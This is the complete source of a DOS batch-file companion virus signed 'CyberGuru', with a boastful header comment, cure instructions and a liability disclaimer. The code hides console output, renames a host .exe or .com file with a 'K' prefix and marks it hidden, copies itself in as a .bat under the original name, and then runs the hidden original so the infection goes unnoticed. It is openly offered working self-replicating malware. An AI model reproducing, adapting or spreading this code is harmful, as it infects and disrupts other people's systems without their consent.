@echo off
ctty nul
rem * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
rem *                                                                   *
rem *     This Virus was made by CyberGuru. If you are reading this     *
rem *  text, than you must have found my virus. Too bad for you!  }:-)  *
rem *  This virus can be cured simply by typing "attrib -h -r K*.*" in  *
rem *  infected directories and deleting .BAT files that are identical  *
rem *  to this code, then rename the files having a "K" at the start    *
rem *  to their original names.   NOTE: Does not infect COMMAND.COM.    *
rem *                                                                   *
rem *                                                                   *
rem *  DISCLAIMER-                                                      *
rem *                                                                   *
rem *     CyberGuru cannot be held liable for the use or misuse of this *
rem *  program and/or it's code. I didn't make any destructive payload  *
rem *  for this because I don't believe in doing intentional damage to  *
rem *  another persons computer. If someone adds destructive code to    *
rem *  this program, I can't be held liable. Do you understand what I'm *
rem *  trying to say!?!                                                 *
rem *                                                                   *
rem *                  I AM NOT LIABLE FOR ANYTHING !                   *
rem *                                                                   *
rem * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
for %%f in (*.exe *.com) do set A=%%f
if %A%==COMMAND.COM set A=
rename %A% K%A%
if not exist K%A% goto end
attrib +h K%A%
copy %0.bat %A%
attrib +r %A%
ren %A% *.bat
set A=
:end
ctty con
@if exist K%0.com K%0.com %1 %2 %3
@if exist K%0.exe K%0.exe %1 %2 %3

